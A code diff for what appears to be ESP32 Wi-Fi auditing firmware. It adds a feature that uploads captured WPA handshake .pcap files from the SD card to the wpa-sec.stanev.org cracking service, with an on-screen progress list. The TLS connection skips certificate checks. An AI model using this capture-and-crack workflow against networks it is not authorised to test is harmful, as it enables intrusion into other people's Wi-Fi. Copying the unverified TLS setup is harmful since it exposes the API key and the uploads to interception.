+        if (!file_buf) {
+            file_buf = (uint8_t *)malloc((size_t)file_size);
+        }
+        if (!file_buf) {
+            ESP_LOGW(TAG, "WPA-SEC: Memory allocation failed (%ld bytes)", file_size);
+            fclose(f);
+            xSemaphoreGive(sd_spi_mutex);
+            return -1;
+        }
+
+        size_t bytes_read = fread(file_buf, 1, (size_t)file_size, f);
+        fclose(f);
+        xSemaphoreGive(sd_spi_mutex);
+
+        if (bytes_read != (size_t)file_size) {
+            ESP_LOGW(TAG, "WPA-SEC: Read error: got %zu of %ld bytes", bytes_read, file_size);
+            free(file_buf);
+            return -1;
+        }
+    } else {
+        ESP_LOGW(TAG, "WPA-SEC: Could not take SD mutex");
+        return -1;
+    }
+
+    // Build multipart body parts
+    char boundary[32];
+    snprintf(boundary, sizeof(boundary), "----WpaSec%lu", (unsigned long)(esp_timer_get_time() / 1000));
+
+    char body_start[256];
+    int start_len = snprintf(body_start, sizeof(body_start),
+        "--%s\r\n"
+        "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
+        "Content-Type: application/octet-stream\r\n\r\n",
+        boundary, filename);
+
+    char body_end[48];
+    int end_len = snprintf(body_end, sizeof(body_end), "\r\n--%s--\r\n", boundary);
+
+    int body_total_len = start_len + (int)file_size + end_len;
+
+    // Build HTTP request headers
+    char http_headers[512];
+    int hdr_len = snprintf(http_headers, sizeof(http_headers),
+        "POST / HTTP/1.1\r\n"
+        "Host: wpa-sec.stanev.org\r\n"
+        "Cookie: key=%s\r\n"
+        "Content-Type: multipart/form-data; boundary=%s\r\n"
+        "Content-Length: %d\r\n"
+        "User-Agent: pancake-wpasec\r\n"
+        "Connection: close\r\n"
+        "\r\n",
+        wpasec_api_key, boundary, body_total_len);
+
+    // Open TLS connection - skip server cert verification
+    esp_tls_cfg_t tls_cfg = {
+        .crt_bundle_attach = NULL,
+        .timeout_ms = 15000,
+    };
+
+    esp_tls_t *tls = esp_tls_init();
+    if (!tls) {
+        ESP_LOGW(TAG, "WPA-SEC: TLS init failed");
+        free(file_buf);
+        return -1;
+    }
+
+    int ret = esp_tls_conn_http_new_sync(WPASEC_URL, &tls_cfg, tls);
+    if (ret < 0) {
+        ESP_LOGW(TAG, "WPA-SEC: TLS connection failed");
+        esp_tls_conn_destroy(tls);
+        free(file_buf);
+        return -1;
+    }
+
+    // Send HTTP headers
+    if (wpasec_tls_write_all(tls, http_headers, hdr_len) < 0) {
+        ESP_LOGW(TAG, "WPA-SEC: Failed to send HTTP headers");
+        esp_tls_conn_destroy(tls);
+        free(file_buf);
+        return -1;
+    }
+
+    // Send multipart body: start boundary + file data + end boundary
+    int write_ok = 1;
+    if (wpasec_tls_write_all(tls, body_start, start_len) < 0) write_ok = 0;
+    if (write_ok && wpasec_tls_write_all(tls, (const char *)file_buf, (int)file_size) < 0) write_ok = 0;
+    if (write_ok && wpasec_tls_write_all(tls, body_end, end_len) < 0) write_ok = 0;
+    free(file_buf);
+
+    if (!write_ok) {
+        ESP_LOGW(TAG, "WPA-SEC: Failed to send body");
+        esp_tls_conn_destroy(tls);
+        return -1;
+    }
+
+    // Read response
+    char resp_buf[512] = {0};
+    int total_read = 0;
+    while (total_read < (int)sizeof(resp_buf) - 1) {
+        ret = esp_tls_conn_read(tls, resp_buf + total_read, sizeof(resp_buf) - 1 - total_read);
+        if (ret <= 0) break;
+        total_read += ret;
+    }
+    resp_buf[total_read] = '\0';
+
+    esp_tls_conn_destroy(tls);
+
+    // Parse HTTP status code from response
+    int status = 0;
+    if (total_read > 12 && strncmp(resp_buf, "HTTP/", 5) == 0) {
+        const char *sp = strchr(resp_buf, ' ');
+        if (sp) status = atoi(sp + 1);
+    }
+
+    if (status == 200) {
+        if (strstr(resp_buf, "already submitted") != NULL) {
+            return 1; // duplicate
+        }
+        return 0; // success
+    } else {
+        ESP_LOGW(TAG, "WPA-SEC: HTTP error %d", status);
+        return -1;
+    }
+}
+
+/**
+ * @brief Background FreeRTOS task that uploads all handshakes
+ * Pushes UI messages to wpasec_ui_queue for the LVGL timer to display.
+ */
+static void wpasec_upload_task(void *pvParameters)
+{
+    (void)pvParameters;
+
+    wpasec_ui_msg_t ui_msg;
+
+    // Open handshakes directory (need SD mutex)
+    DIR *dir = NULL;
+    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
+        dir = opendir("/sdcard/lab/handshakes");
+        xSemaphoreGive(sd_spi_mutex);
+    }
+
+    if (dir == NULL) {
+        snprintf(ui_msg.text, sizeof(ui_msg.text), "Failed to open handshakes directory");
+        ui_msg.color = lv_color_make(244, 67, 54); // red
+        if (wpasec_ui_queue) xQueueSend(wpasec_ui_queue, &ui_msg, pdMS_TO_TICKS(200));
+        wpasec_upload_done = true;
+        wpasec_upload_active = false;
+        wpasec_upload_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    // Count .pcap files first
+    struct dirent *entry;
+    int total_files = 0;
+
+    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
+        while ((entry = readdir(dir)) != NULL) {
+            if (entry->d_type == DT_DIR) continue;
+            size_t nlen = strlen(entry->d_name);
+            if (nlen > 5 && strcasecmp(entry->d_name + nlen - 5, ".pcap") == 0) {
+                total_files++;
+            }
+        }
+        rewinddir(dir);
+        xSemaphoreGive(sd_spi_mutex);
+    }
+
+    if (total_files == 0) {
+        snprintf(ui_msg.text, sizeof(ui_msg.text), "No .pcap files found");
+        ui_msg.color = lv_color_make(255, 152, 0); // orange
+        if (wpasec_ui_queue) xQueueSend(wpasec_ui_queue, &ui_msg, pdMS_TO_TICKS(200));
+        if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
+            closedir(dir);
+            xSemaphoreGive(sd_spi_mutex);
+        }
+        wpasec_upload_done = true;
+        wpasec_upload_active = false;
+        wpasec_upload_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    snprintf(ui_msg.text, sizeof(ui_msg.text), "Uploading %d handshake(s)...", total_files);
+    ui_msg.color = lv_color_make(0, 188, 212); // cyan
+    if (wpasec_ui_queue) xQueueSend(wpasec_ui_queue, &ui_msg, pdMS_TO_TICKS(200));
+
+    int current = 0;
+    int uploaded = 0;
+    int duplicates = 0;
+    int failed = 0;
+
+    // Iterate through directory entries
+    while (wpasec_upload_active) {
+        char d_name[256];
+        bool got_entry = false;
+
+        if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
+            entry = readdir(dir);
+            if (entry != NULL) {
+                strncpy(d_name, entry->d_name, sizeof(d_name) - 1);
+                d_name[sizeof(d_name) - 1] = '\0';
+                got_entry = true;
+            }
+            xSemaphoreGive(sd_spi_mutex);
+        }
+
+        if (!got_entry) break;
+
+        // Filter: skip dirs and non-.pcap files
+        size_t nlen = strlen(d_name);
+        if (nlen <= 5 || strcasecmp(d_name + nlen - 5, ".pcap") != 0) continue;
+
+        current++;
+        char filepath[280];
+        snprintf(filepath, sizeof(filepath), "/sdcard/lab/handshakes/%s", d_name);
+
+        // Get file size for display
+        struct stat st;
+        long fsize = 0;
+        if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(2000)) == pdTRUE) {
+            if (stat(filepath, &st) == 0) {
+                fsize = (long)st.st_size;
+            }
+            xSemaphoreGive(sd_spi_mutex);
+        }
+
+        // Send "uploading" message — truncate filename for display
+        char short_name[128];
+        strncpy(short_name, d_name, sizeof(short_name) - 1);
+        short_name[sizeof(short_name) - 1] = '\0';
+
+        snprintf(ui_msg.text, sizeof(ui_msg.text), "[%d/%d] %.120s (%ld B)...", current, total_files, short_name, fsize);
+        ui_msg.color = lv_color_make(0, 188, 212); // cyan
+        if (wpasec_ui_queue) xQueueSend(wpasec_ui_queue, &ui_msg, pdMS_TO_TICKS(200));
+
+        int result = wpasec_upload_file(filepath, d_name);
+
+        if (result == 0) {
+            snprintf(ui_msg.text, sizeof(ui_msg.text), "[%d/%d] %.120s -> OK", current, total_files, short_name);
+            ui_msg.color = lv_color_make(76, 175, 80); // green
+            uploaded++;
+        } else if (result == 1) {
+            snprintf(ui_msg.text, sizeof(ui_msg.text), "[%d/%d] %.120s -> dup", current, total_files, short_name);
+            ui_msg.color = lv_color_make(255, 193, 7); // amber
+            duplicates++;
+        } else {
+            snprintf(ui_msg.text, sizeof(ui_msg.text), "[%d/%d] %.120s -> FAIL", current, total_files, short_name);
+            ui_msg.color = lv_color_make(244, 67, 54); // red
+            failed++;
+        }
+        if (wpasec_ui_queue) xQueueSend(wpasec_ui_queue, &ui_msg, pdMS_TO_TICKS(200));
+
+        // Small delay between uploads
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+
+    // Close directory
+    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
+        closedir(dir);
+        xSemaphoreGive(sd_spi_mutex);
+    }
+
+    // Summary
+    snprintf(ui_msg.text, sizeof(ui_msg.text), "Done: %d uploaded, %d dup, %d failed", uploaded, duplicates, failed);
+    ui_msg.color = (failed > 0) ? lv_color_make(244, 67, 54) : lv_color_make(76, 175, 80);
+    if (wpasec_ui_queue) xQueueSend(wpasec_ui_queue, &ui_msg, pdMS_TO_TICKS(200));
+
+    wpasec_upload_done = true;
+    wpasec_upload_active = false;
+    wpasec_upload_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+/**
+ * @brief LVGL timer callback - drains wpasec_ui_queue and updates the status list.
+ * Runs every 200ms in the LVGL thread context.
+ */
+static void wpasec_upload_timer_cb(lv_timer_t *timer)
+{
+    (void)timer;
+
+    if (!wpasec_ui_queue) return;
+
+    wpasec_ui_msg_t ui_msg;
+    while (xQueueReceive(wpasec_ui_queue, &ui_msg, 0) == pdTRUE) {
+        if (wpasec_status_list && lv_obj_is_valid(wpasec_status_list)) {
+            lv_obj_t *item = lv_list_add_text(wpasec_status_list, ui_msg.text);
+            if (item) {
+                lv_obj_set_style_text_color(item, ui_msg.color, 0);
+                lv_obj_set_style_bg_color(item, lv_color_make(0, 0, 0), 0);
+                lv_obj_set_style_bg_opa(item, LV_OPA_COVER, 0);
+                lv_obj_set_style_text_font(item, &lv_font_montserrat_12, 0);
+                lv_obj_set_style_pad_ver(item, 2, 0);
+            }
+            lv_obj_scroll_to_y(wpasec_status_list, LV_COORD_MAX, LV_ANIM_ON);
+        }
+
+        // Also update progress label with the last message
+        if (wpasec_progress_label && lv_obj_is_valid(wpasec_progress_label)) {
+            lv_label_set_text(wpasec_progress_label, ui_msg.text);
+        }
+    }
+
+    // When done, delete the timer
+    if (wpasec_upload_done) {
+        lv_timer_del(wpasec_upload_timer);
+        wpasec_upload_timer = NULL;
+    }
+}
+
+/**
+ * @brief Show the WPA-SEC Upload page.
+ * Reads API key from SD, checks handshake count, starts background upload task.
+ */
 static void show_wpa_sec_upload_page(void)
 {
     create_function_page_base("WPA-SEC Upload");
-    
+
+    // 1. Read API key from SD card
+    if (!wpasec_read_key_from_sd()) {
+        // Show error popup
+        lv_obj_t *overlay = lv_obj_create(function_page);
+        lv_obj_set_size(overlay, lv_pct(90), 120);
+        lv_obj_center(overlay);
+        lv_obj_set_style_bg_color(overlay, lv_color_make(30, 30, 30), 0);
+        lv_obj_set_style_border_color(overlay, lv_color_make(244, 67, 54), 0);
+        lv_obj_set_style_border_width(overlay, 2, 0);
+        lv_obj_set_style_radius(overlay, 10, 0);
+        lv_obj_clear_flag(overlay, LV_OBJ_FLAG_SCROLLABLE);
+
+        lv_obj_t *err = lv_label_create(overlay);
+        lv_label_set_text(err, "API key not found!\n\nPlace your key in:\n/sdcard/lab/wpa-sec.txt");
+        lv_obj_set_style_text_color(err, lv_color_make(244, 67, 54), 0);
+        lv_obj_set_style_text_font(err, &lv_font_montserrat_14, 0);
+        lv_obj_set_style_text_align(err, LV_TEXT_ALIGN_CENTER, 0);
+        lv_obj_center(err);
+        return;
+    }
+
+    // 2. Check handshake count
+    int hs_count = sd_cache_get_handshake_count();
+    if (hs_count == 0) {
+        lv_obj_t *overlay = lv_obj_create(function_page);
+        lv_obj_set_size(overlay, lv_pct(90), 100);
+        lv_obj_center(overlay);
+        lv_obj_set_style_bg_color(overlay, lv_color_make(30, 30, 30), 0);
+        lv_obj_set_style_border_color(overlay, lv_color_make(255, 152, 0), 0);
+        lv_obj_set_style_border_width(overlay, 2, 0);
+        lv_obj_set_style_radius(overlay, 10, 0);
+        lv_obj_clear_flag(overlay, LV_OBJ_FLAG_SCROLLABLE);
+
+        lv_obj_t *msg = lv_label_create(overlay);
+        lv_label_set_text(msg, "No handshakes to upload.\n\nCapture some handshakes first!");
+        lv_obj_set_style_text_color(msg, lv_color_make(255, 152, 0), 0);
+        lv_obj_set_style_text_font(msg, &lv_font_montserrat_14, 0);
+        lv_obj_set_style_text_align(msg, LV_TEXT_ALIGN_CENTER, 0);
+        lv_obj_center(msg);
+        return;
+    }
+
+    // 3. Build upload UI
+    // Title
     lv_obj_t *title = lv_label_create(function_page);
     lv_label_set_text(title, "WPA-SEC Upload");
     lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
-    lv_obj_set_style_text_color(title, COLOR_MATERIAL_CYAN, 0);
+    lv_obj_set_style_text_color(title, lv_color_make(0, 188, 212), 0);
     lv_obj_set_style_text_align(title, LV_TEXT_ALIGN_CENTER, 0);
-    lv_obj_center(title);
+    lv_obj_align(title, LV_ALIGN_TOP_MID, 0, 35);
+
+    // Info line: key + count
+    char info_buf[80];
+    snprintf(info_buf, sizeof(info_buf), "Key: %.4s****  |  %d handshake(s)", wpasec_api_key, hs_count);
+    lv_obj_t *info = lv_label_create(function_page);
+    lv_label_set_text(info, info_buf);
+    lv_obj_set_style_text_color(info, lv_color_make(176, 176, 176), 0);
+    lv_obj_set_style_text_font(info, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_align(info, LV_TEXT_ALIGN_CENTER, 0);
+    lv_obj_align(info, LV_ALIGN_TOP_MID, 0, 60);
+
+    // Progress label (current file being uploaded)
+    wpasec_progress_label = lv_label_create(function_page);
+    lv_label_set_text(wpasec_progress_label, "Starting upload...");
+    lv_label_set_long_mode(wpasec_progress_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
+    lv_obj_set_width(wpasec_progress_label, lv_pct(96));
+    lv_obj_set_style_text_color(wpasec_progress_label, lv_color_make(0, 188, 212), 0);
+    lv_obj_set_style_text_font(wpasec_progress_label, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_align(wpasec_progress_label, LV_TEXT_ALIGN_CENTER, 0);
+    lv_obj_align(wpasec_progress_label, LV_ALIGN_TOP_MID, 0, 76);
+
+    // Status list (terminal-style: black bg, cyan border)
+    wpasec_status_list = lv_list_create(function_page);
+    lv_obj_set_size(wpasec_status_list, lv_pct(96), LCD_V_RES - 30 - 100);
+    lv_obj_align(wpasec_status_list, LV_ALIGN_TOP_MID, 0, 92);
+    lv_obj_set_style_bg_color(wpasec_status_list, lv_color_make(0, 0, 0), 0);
+    lv_obj_set_style_border_color(wpasec_status_list, lv_color_make(0, 188, 212), 0);
+    lv_obj_set_style_border_width(wpasec_status_list, 1, 0);
+    lv_obj_set_style_pad_all(wpasec_status_list, 4, 0);
+    lv_obj_set_style_text_color(wpasec_status_list, lv_color_make(0, 188, 212), 0);
+
+    // 4. Create message queue and start upload
+    if (wpasec_ui_queue) {
+        vQueueDelete(wpasec_ui_queue);
+    }
+    wpasec_ui_queue = xQueueCreate(16, sizeof(wpasec_ui_msg_t));
+
+    wpasec_upload_done = false;
+    wpasec_upload_active = true;
+
+    // Create LVGL timer for UI updates (200ms)
+    wpasec_upload_timer = lv_timer_create(wpasec_upload_timer_cb, 200, NULL);
+
+    // Start background upload task (8KB stack in PSRAM)
+    StackType_t *task_stack = (StackType_t *)heap_caps_malloc(8192 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+    if (task_stack) {
+        static StaticTask_t task_buf;
+        wpasec_upload_task_handle = xTaskCreateStatic(
+            wpasec_upload_task, "wpasec_up", 8192, NULL, 5,
+            task_stack, &task_buf);
+        if (!wpasec_upload_task_handle) {
+            ESP_LOGE(TAG, "WPA-SEC: Failed to create upload task");
+            heap_caps_free(task_stack);
+            wpasec_upload_active = false;
+            wpasec_upload_done = true;
+        }
+    } else {
+        ESP_LOGE(TAG, "WPA-SEC: Failed to allocate task stack");
+        wpasec_upload_active = false;
+        wpasec_upload_done = true;
+    }
 }
 
 // Attack tiles screen - shown after selecting networks
@@ -10855,8 +12861,6 @@ void attack_event_cb(lv_event_t *e)
     }
 
     if (strcmp(attack_name, "Start Wardrive") == 0) {
-        // Directly start wardrive - no warning
-        create_function_page_base("Wardrive");
         wardrive_start_btn_cb(NULL);
         return;
     }
@@ -11310,6 +13314,7 @@ static bool parse_gps_nmea(const char *nmea_sentence)
 					break;
 				case 5: lon_dir = token[0]; break;
 				case 6: quality = atoi(token); break;
+				case 7: current_gps.satellites = atoi(token); break;
 				case 8: hdop = atof(token); break;
 				case 9: altitude = atof(token); break;
 			}
